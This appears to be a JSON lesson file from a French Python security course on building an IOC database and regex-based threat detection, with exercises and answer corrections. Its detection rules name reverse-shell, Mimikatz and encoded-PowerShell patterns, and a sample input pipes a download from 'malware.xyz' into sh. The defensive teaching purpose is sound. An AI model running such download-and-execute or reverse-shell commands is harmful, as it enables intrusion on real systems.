@@ -1,0 +1,58 @@
+{
+  "id": "py-l4-m6",
+  "title": "Base d'IOC et détection de menaces",
+  "lang": "python",
+  "level": 4,
+  "order": 6,
+  "estimatedMinutes": 60,
+  "course": [
+    {
+      "section": "Structure d'une base d'IOC",
+      "content": "Une base d'IOC (Indicators of Compromise) centralise les indicateurs malveillants : IPs, domaines, hashes, URLs. En Python, un dictionnaire ou SQLite est idéal pour des recherches rapides.\n\n```python\nfrom datetime import datetime\n\n# Structure d'un IOC\nioc_exemple = {\n    \"valeur\": \"185.220.101.3\",\n    \"type\": \"ip\",           # ip | domain | hash | url\n    \"tags\": [\"tor\", \"c2\"],\n    \"score\": 95,            # 0-100\n    \"source\": \"threat_intel\",\n    \"date_ajout\": \"2024-01-15\",\n    \"actif\": True\n}\n\n# Base locale en mémoire\nIOC_DB = {\n    \"185.220.101.3\":   {\"type\": \"ip\",     \"tags\": [\"tor\", \"c2\"],      \"score\": 95},\n    \"malware.xyz\":     {\"type\": \"domain\", \"tags\": [\"phishing\"],       \"score\": 80},\n    \"d41d8cd98f00b204e9800998ecf8427e\": {\"type\": \"hash\", \"tags\": [\"malware\"], \"score\": 100},\n    \"194.165.16.11\":   {\"type\": \"ip\",     \"tags\": [\"scanner\"],        \"score\": 70},\n}\n\nprint(f\"IOC chargés : {len(IOC_DB)}\")\nfor valeur, meta in IOC_DB.items():\n    print(f\"  {meta['type']:8} | {valeur:40} | score={meta['score']}\")\n```"
+    },
+    {
+      "section": "Recherche et enrichissement d'IOC",
+      "content": "```python\ndef rechercher_ioc(valeur, db):\n    \"\"\"Recherche un IOC dans la base et retourne ses métadonnées.\"\"\"\n    if valeur in db:\n        ioc = db[valeur].copy()\n        ioc[\"valeur\"] = valeur\n        ioc[\"trouve\"] = True\n        return ioc\n    return {\"valeur\": valeur, \"trouve\": False, \"score\": 0}\n\ndef ajouter_ioc(valeur, type_ioc, tags, score, db):\n    \"\"\"Ajoute ou met à jour un IOC dans la base.\"\"\"\n    db[valeur] = {\n        \"type\": type_ioc,\n        \"tags\": tags,\n        \"score\": score,\n        \"date_ajout\": datetime.now().isoformat()[:10],\n        \"actif\": True\n    }\n    print(f\"IOC ajouté : {valeur} [{type_ioc}] score={score}\")\n\ndef batch_lookup(valeurs, db):\n    \"\"\"Recherche en lot — retourne les IOC trouvés et non trouvés.\"\"\"\n    trouves = []\n    inconnus = []\n    for v in valeurs:\n        r = rechercher_ioc(v, db)\n        if r[\"trouve\"]:\n            trouves.append(r)\n        else:\n            inconnus.append(v)\n    print(f\"Lookup : {len(trouves)} trouvés, {len(inconnus)} inconnus\")\n    return trouves, inconnus\n\n# Test\nresultat = rechercher_ioc(\"185.220.101.3\", IOC_DB)\nprint(f\"Trouvé : {resultat['trouve']} | Score : {resultat['score']} | Tags : {resultat['tags']}\")\n\ntrouves, _ = batch_lookup([\"185.220.101.3\", \"8.8.8.8\", \"194.165.16.11\"], IOC_DB)\nfor ioc in trouves:\n    print(f\"  MATCH : {ioc['valeur']} (score={ioc['score']})\")\n```"
+    },
+    {
+      "section": "Détection par règles YARA-like",
+      "content": "```python\nimport re\n\n# Règles de détection simplifiées (inspirées de YARA)\nREGLES = [\n    {\n        \"nom\": \"POWERSHELL_ENCODED\",\n        \"description\": \"PowerShell avec payload encodé en base64\",\n        \"severite\": \"HAUTE\",\n        \"pattern\": re.compile(r\"powershell.*-enc.*[A-Za-z0-9+/]{50,}\", re.I),\n    },\n    {\n        \"nom\": \"MIMIKATZ_STRINGS\",\n        \"description\": \"Strings caractéristiques de Mimikatz\",\n        \"severite\": \"CRITIQUE\",\n        \"pattern\": re.compile(r\"sekurlsa|lsadump|kerberos::ptc\", re.I),\n    },\n    {\n        \"nom\": \"REVERSE_SHELL\",\n        \"description\": \"Tentative de reverse shell\",\n        \"severite\": \"CRITIQUE\",\n        \"pattern\": re.compile(r\"bash\\s+-i.*>&.*\\/dev\\/tcp|nc\\s+-e\\s+\\/bin\\/\", re.I),\n    },\n    {\n        \"nom\": \"SUSPICIOUS_DOWNLOAD\",\n        \"description\": \"Téléchargement et exécution en une ligne\",\n        \"severite\": \"HAUTE\",\n        \"pattern\": re.compile(r\"(wget|curl).*\\|.*sh|iex.*downloadstring\", re.I),\n    },\n]\n\ndef scanner_texte(texte):\n    \"\"\"Scanne un texte contre les règles de détection.\"\"\"\n    alertes = []\n    for regle in REGLES:\n        if regle[\"pattern\"].search(texte):\n            alertes.append({\n                \"regle\": regle[\"nom\"],\n                \"severite\": regle[\"severite\"],\n                \"description\": regle[\"description\"]\n            })\n    return alertes\n\n# Test\ncommandes_suspectes = [\n    \"powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==\",\n    \"wget http://malware.xyz/shell.sh | sh\",\n    \"ls -la /home\",  # Bénin\n]\n\nfor cmd in commandes_suspectes:\n    alertes = scanner_texte(cmd)\n    status = f\"{len(alertes)} alerte(s)\" if alertes else \"OK\"\n    print(f\"[{status}] {cmd[:60]}\")\n    for a in alertes:\n        print(f\"  → [{a['severite']}] {a['regle']}: {a['description']}\")\n```"
+    },
+    {
+      "section": "Persistance SQLite pour l'IOC DB",
+      "content": "```python\nimport sqlite3\nfrom datetime import datetime\n\ndef creer_db_ioc(chemin=\"ioc.db\"):\n    \"\"\"Crée une base SQLite pour stocker les IOC.\"\"\"\n    conn = sqlite3.connect(chemin)\n    conn.execute(\"\"\"\n        CREATE TABLE IF NOT EXISTS iocs (\n            valeur    TEXT PRIMARY KEY,\n            type      TEXT NOT NULL,\n            tags      TEXT,\n            score     INTEGER DEFAULT 0,\n            source    TEXT,\n            date_ajout TEXT,\n            actif     INTEGER DEFAULT 1\n        )\n    \"\"\")\n    conn.commit()\n    return conn\n\ndef importer_iocs(conn, iocs):\n    \"\"\"Importe une liste d'IOC dans SQLite.\"\"\"\n    conn.executemany(\n        \"INSERT OR REPLACE INTO iocs (valeur, type, tags, score, source, date_ajout) VALUES (?,?,?,?,?,?)\",\n        [(i[\"valeur\"], i[\"type\"], \",\".join(i.get(\"tags\", [])),\n          i.get(\"score\", 0), i.get(\"source\", \"manual\"),\n          datetime.now().isoformat()[:10]) for i in iocs]\n    )\n    conn.commit()\n    print(f\"{len(iocs)} IOC importés\")\n\ndef rechercher_sqlite(conn, valeur):\n    \"\"\"Recherche un IOC dans SQLite.\"\"\"\n    row = conn.execute(\n        \"SELECT * FROM iocs WHERE valeur = ? AND actif = 1\", (valeur,)\n    ).fetchone()\n    if row:\n        return {\"valeur\": row[0], \"type\": row[1], \"tags\": row[2], \"score\": row[3]}\n    return None\n\n# Test\nconn = creer_db_ioc(\":memory:\")  # En mémoire pour le test\niocs_a_importer = [\n    {\"valeur\": \"185.220.101.3\", \"type\": \"ip\",     \"tags\": [\"tor\"],   \"score\": 95},\n    {\"valeur\": \"malware.xyz\",   \"type\": \"domain\", \"tags\": [\"phish\"], \"score\": 80},\n]\nimporter_iocs(conn, iocs_a_importer)\n\nresultat = rechercher_sqlite(conn, \"185.220.101.3\")\nif resultat:\n    print(f\"IOC trouvé : {resultat['valeur']} | score={resultat['score']}\")\nconn.close()\n```"
+    }
+  ],
+  "exercises": [
+    {
+      "id": "py-l4-m6-ex1",
+      "title": "Rechercher un IOC dans une base",
+      "description": "Implémenter une recherche dans un dictionnaire d'IOC",
+      "instructions": "Soit :\n```python\nioc_db = {\n    \"185.220.101.3\": {\"type\": \"ip\", \"score\": 95, \"tags\": [\"tor\"]},\n    \"8.8.8.8\": {\"type\": \"ip\", \"score\": 0, \"tags\": []},\n}\nip = \"185.220.101.3\"\n```\nSi l'IP est dans la base et son score >= 80, affichez :\n```\nIOC malveillant : 185.220.101.3 (score=95)\n```",
+      "validationType": "output_contains",
+      "expectedOutput": "IOC malveillant : 185.220.101.3 (score=95)",
+      "correction": "ioc_db = {\n    \"185.220.101.3\": {\"type\": \"ip\", \"score\": 95, \"tags\": [\"tor\"]},\n    \"8.8.8.8\": {\"type\": \"ip\", \"score\": 0, \"tags\": []},\n}\nip = \"185.220.101.3\"\nif ip in ioc_db and ioc_db[ip][\"score\"] >= 80:\n    print(f\"IOC malveillant : {ip} (score={ioc_db[ip]['score']})\")\nelse:\n    print(f\"{ip} : propre\")",
+      "explanation": "La recherche dans un dictionnaire est O(1) — idéale pour des bases IOC de millions d'entrées. Le seuil de score (ici 80) permet de filtrer les faux positifs."
+    },
+    {
+      "id": "py-l4-m6-ex2",
+      "title": "Scanner une commande suspecte",
+      "description": "Détecter des patterns malveillants dans une commande",
+      "instructions": "Vérifiez si la commande suivante correspond à un pattern suspect :\n```python\nimport re\ncmd = \"powershell -enc JABjAGwAaQBlAG4AdAA=\"\npattern = re.compile(r\"powershell.*-enc\", re.I)\n```\nAffichez :\n```\nCommande suspecte : True\n```",
+      "validationType": "output_contains",
+      "expectedOutput": "Commande suspecte : True",
+      "correction": "import re\ncmd = \"powershell -enc JABjAGwAaQBlAG4AdAA=\"\npattern = re.compile(r\"powershell.*-enc\", re.I)\nsuspecte = bool(pattern.search(cmd))\nprint(f\"Commande suspecte : {suspecte}\")",
+      "explanation": "`re.I` rend la détection insensible à la casse (`POWERSHELL`, `PowerShell`, `powershell` sont tous détectés). `bool()` convertit le match object en True/False."
+    },
+    {
+      "id": "py-l4-m6-ex3",
+      "title": "Compter les IOC par type",
+      "description": "Statistiques sur une base d'IOC",
+      "instructions": "Soit :\n```python\niocs = [\n    {\"valeur\": \"185.220.101.3\", \"type\": \"ip\"},\n    {\"valeur\": \"malware.xyz\",   \"type\": \"domain\"},\n    {\"valeur\": \"194.165.16.11\", \"type\": \"ip\"},\n    {\"valeur\": \"d41d8cd9...\",   \"type\": \"hash\"},\n]\n```\nAffichez le type le plus représenté :\n```\nType dominant : ip (2 IOC)\n```",
+      "validationType": "output_contains",
+      "expectedOutput": "Type dominant : ip (2 IOC)",
+      "correction": "from collections import Counter\niocs = [\n    {\"valeur\": \"185.220.101.3\", \"type\": \"ip\"},\n    {\"valeur\": \"malware.xyz\",   \"type\": \"domain\"},\n    {\"valeur\": \"194.165.16.11\", \"type\": \"ip\"},\n    {\"valeur\": \"d41d8cd9...\",   \"type\": \"hash\"},\n]\nc = Counter(i[\"type\"] for i in iocs)\ntop, n = c.most_common(1)[0]\nprint(f\"Type dominant : {top} ({n} IOC)\")",
+      "explanation": "Connaître la distribution des types d'IOC aide à prioriser les analyses. Si les IPs dominent, le réseau est la surface d'attaque principale ; si les hashes dominent, l'endpoint est ciblé."
+    }
+  ]
+}
